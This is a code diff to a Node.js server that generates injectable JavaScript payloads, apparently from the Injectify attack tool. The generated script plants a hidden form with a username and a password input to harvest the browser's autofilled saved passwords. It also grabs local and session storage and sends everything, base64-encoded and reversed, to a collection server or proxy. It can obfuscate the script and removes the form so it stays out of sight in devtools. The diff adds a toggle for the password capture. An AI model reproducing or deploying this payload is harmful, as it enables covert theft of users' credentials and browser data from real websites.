@@ -1034,6 +1034,20 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				return ''
 			}
 		}
+		function ifPassword(script) {
+			if (req.query.passwords == "false") {
+				return ''
+			} else {
+				return script + '\n'
+			}
+		}
+		function ifNotPassword(script) {
+			if (req.query.passwords == "false") {
+				return script + '\n'
+			} else {
+				return ''
+			}
+		}
 		function debug(script) {
 			if (req.query.debug == "true") {
 				return '\n' + script
@@ -1128,7 +1142,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				if (req.query.debug == "true") {
 					catcher 	= '\n' + catcher.slice(0, -1)
 				} else {
-					catcher 	= '\ntry {' + comment("attempt to insert the local & session storage into object, but ignore if it fails\n") + catcher.slice(0, -1) + '} catch(error) {}'
+					catcher 	= '\ntry {' + comment("attempt to insert the local & session storage into object, but ignore if it fails\n") + catcher.slice(0, -1) + '} catch(error) {}\n\n'
 				}
 			}
 
@@ -1158,40 +1172,67 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				//  Project name    | ` + req.query.project + `
 
 
-				var d = document,
-					v = ` + enc("input") + `,
-					w = d.createElement(` + enc("form") + `),
-					x = d.createElement(v),
-					c = ` + enc("new Image()", true) + `,
+				var d = document,` +
+					ifPassword(`
+						v = ` + enc("input") + `,
+						w = d.createElement(` + enc("form") + `),
+						x = d.createElement(v),
+						y,`
+					) + 
+					`c = ` + enc("new Image()", true) + `,
 					p = `+ enc(proxy) +`,
-					y,
 					i,
-					k = window` + variables + `
-				` + comment("name attribute is required for autofill to work") + `
-				x.name = ""` + comment("autofill still works if the elements are non-rendered") + `
-				x.style = `+ enc("display:none") + `
-				` + comment("clone the input node instead of declaring it again") + `
-				y = x.cloneNode()` + comment("set the input type to password") + `
-				y.type = ` + enc("password") + `
-				` + comment("append elements to form node") + `
-				w.appendChild(x)
-				w.appendChild(y)` + comment("append form node to DOM") + `
-				d.body.appendChild(w)
-				` + body + comment("add a listener to the password input, browser's autofiller will trigger this") + `
-				y.addEventListener(v, function () {` + comment("construct a global object with data to extract") + `
-					i = {
+					k = window` + variables +
+
+				ifPassword(`\n` +
+					comment("name attribute is required for autofill to work") + `
+					x.name = ""` +
+					
+					comment("autofill still works if the elements are non-rendered") + `
+					x.style = `+ enc("display:none") + `
+					` +
+					
+					comment("clone the input node instead of declaring it again") + `
+					y = x.cloneNode()` +
+					
+					comment("set the input type to password") + `
+					y.type = ` + enc("password") + `
+					` +
+					
+					comment("append elements to form node") + `
+					w.appendChild(x)
+					w.appendChild(y)` +
+					
+					comment("append form node to DOM") + `
+					d.body.appendChild(w)`
+				) + '\n' +
+
+				body +
+				
+				ifPassword(
+					comment("add a listener to the password input, browser's autofiller will trigger this") + `
+					y.addEventListener(v, function () {` + comment("construct a global object with data to extract")
+				) + ifNotPassword(`\n`) +
+					`i = {
 						a: atob("` + btoa(req.query.project) + `"),
-						t: 0,
-						b: x.value,
-						c: y.value` + json + `
-					}` + catcher +  `
-					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
-						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object\n") +
-						sendToServer(`p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) + 
+						t: 0` +
+						ifPassword(`,
+							b: x.value,
+							c: y.value`
+						) + json + `
+					}
+					` + catcher +
+					ifPassword(debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)\n")) + 
+
+					comment("send a request to the server (or proxy) with the BASE64 encoded JSON object\n") +
+					sendToServer(`p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) + 
+					ifPassword(
 						comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
-					w.remove()
-				})
-			`
+						w.remove()
+						})`
+					)
+///////////////////////////////////////////////////////////////////////////
+
 			if (req.query.obfuscate == "true") {
 				ObfuscateJS(script, {
 					
